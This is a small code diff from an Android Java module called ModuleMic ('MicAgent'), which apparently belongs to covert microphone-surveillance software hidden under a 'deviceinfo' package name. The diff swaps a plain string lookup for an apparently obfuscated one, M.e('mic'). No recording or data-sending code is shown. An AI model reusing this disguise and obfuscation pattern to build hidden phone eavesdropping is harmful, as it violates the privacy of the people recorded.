@@ -20,7 +20,6 @@ import android.net.LocalSocket;
 import android.net.LocalSocketAddress;
 
 import com.android.deviceinfo.Call;
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.StateRun;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
@@ -36,6 +35,7 @@ import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
 import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 /**
  * The Class MicAgent. 8000KHz, 16bit
@@ -70,7 +70,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	boolean phoneListening;
 
 	public static ModuleMic self() {
-		return (ModuleMic) ManagerModule.self().get(Messages.getString("c_8"));
+		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
 	}
 	 
 	/*
